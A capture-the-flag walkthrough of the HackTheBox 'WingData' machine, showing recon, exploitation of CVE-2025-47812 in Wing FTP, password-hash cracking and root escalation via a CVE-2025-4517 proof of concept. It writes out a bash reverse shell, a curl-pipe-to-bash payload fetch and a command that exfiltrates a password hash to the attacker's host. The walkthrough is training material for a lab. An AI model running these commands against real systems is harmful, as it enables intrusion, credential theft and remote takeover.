### WingData--HackTheBox🏴󠁧󠁢󠁥󠁮󠁧󠁿

####  First we need to prove the conexion with the machine.
```bash
ping -c3 10.129.244.106
```

<img width="970" height="205" alt="image" src="https://github.com/user-attachments/assets/6077d5bc-00cb-4caa-b591-62bec0b7cfa5" />


#### Now we`re going to search the open ports with nmap.
```bash
nmap -sCV 10.129.244.106
```

<img width="959" height="326" alt="image" src="https://github.com/user-attachments/assets/a5e458ff-bf38-42b8-839a-9b5ea867066c" />


#### We need to add the webside on the hosts with nano.

<img width="964" height="322" alt="image" src="https://github.com/user-attachments/assets/c6b5e0b2-ac3d-4e92-b2d3-ff803e571440" />


#### Now we look at the hidden ports with fuzz
```bash
ffuf -u http://wingdata.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt \ -mc 200,301,302,403 -t 40
```

<img width="976" height="611" alt="image" src="https://github.com/user-attachments/assets/5dee661c-33e1-41aa-b9ba-dfcc88591fb0" />


#### We look at the ftp website.

<img width="960" height="616" alt="image" src="https://github.com/user-attachments/assets/b86bcfcb-8dbb-446e-b6f7-8f05015331cf" />


#### We clone the repository about the CVE.
```bash
git clone https://github.com/4m3rr0r/CVE-2025-47812-poc.git
cd CVE-2025-47812-poc
```

<img width="965" height="224" alt="image" src="https://github.com/user-attachments/assets/7c6a51d6-c68f-40fa-9509-ff710444b209" />


#### At one terminal we start to hear.
```bash
nc -lvnp 55555
```

<img width="963" height="249" alt="image" src="https://github.com/user-attachments/assets/9c41d774-fe4e-4226-8526-eacf3192be47" />


##### On another terminal we serve the payload and exploit them.
```bash
echo 'bash -i >& /dev/tcp/10.10.15.98/5555 0>&1' > /tmp/shell.sh
cd /tmp && python3 -m http.server 8080

python3 CVE-2025-47812.py -u http://ftp.wingdata.htb \
        -c "curl http://10.10.15.98:8080/shell.sh|bash" -v
```

#### We look that is going well

<img width="965" height="831" alt="image" src="https://github.com/user-attachments/assets/a9a2ab60-0f57-4bea-9b1a-7e183cebdc42" />


#### Now we prove with the password
```bash
python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "grep -i 'password' /opt/wftpserver/Data/1/users/wacky.xml | curl -X POST --data-binary @- http://10.10.15.98:9001/" -v
```

<img width="971" height="1041" alt="image" src="https://github.com/user-attachments/assets/520fadb9-b9db-4402-8fd4-0d3eec1bced9" />

*and we save `echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > wacky.txt`*


#### We're going to start the hashcat
```bash
hashcat -m 1410 wacky.txt /usr/share/wordlists/rockyou.txt
```


<img width="956" height="1034" alt="image" src="https://github.com/user-attachments/assets/5194d316-9288-4b76-8bf2-7c8226de26c9" />


#### Now we connect to the machine with nmap.
```bash
ssh wacky@10.129.244.106
```

<img width="968" height="325" alt="image" src="https://github.com/user-attachments/assets/0f3cc111-0875-46fe-9e43-038b23d6973f" />


#### We have the user flag

<img width="986" height="126" alt="image" src="https://github.com/user-attachments/assets/8ec53dcb-89a4-48b9-868c-00a595f1a5d2" />


#### Now we are going to prove `sudo -l` for search which binaries can manipulate

<img width="964" height="170" alt="image" src="https://github.com/user-attachments/assets/c0835fce-3def-46a1-981e-a7dced52a024" />


#### For exploit first on our kali machile we write this scrips
```bash
git clone https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData.git
cd CVE-2025-4517-POC-HTB-WingData
python3 -m http.server 80
```

<img width="972" height="276" alt="image" src="https://github.com/user-attachments/assets/d33ababd-9d65-4b81-978e-31bccb86a91e" />


#### And on victim machine
```bash
 cd /tmp 
wget http://10.10.15.98/CVE-2025-4517-POC.py   
python3 /tmp/CVE-2025-4517-POC.py
```

<img width="958" height="570" alt="image" src="https://github.com/user-attachments/assets/ea6bfa4b-5d98-439a-88ad-17cc523c7137" />


#### Now we are root and we're going to pick the root's flag.

<img width="968" height="138" alt="image" src="https://github.com/user-attachments/assets/11be8676-fbab-4ad3-aee4-43ea2f9f6785" />


<img width="591" height="548" alt="image" src="https://github.com/user-attachments/assets/d5e813a1-ee36-49e5-a62b-81a6706e23bd" />









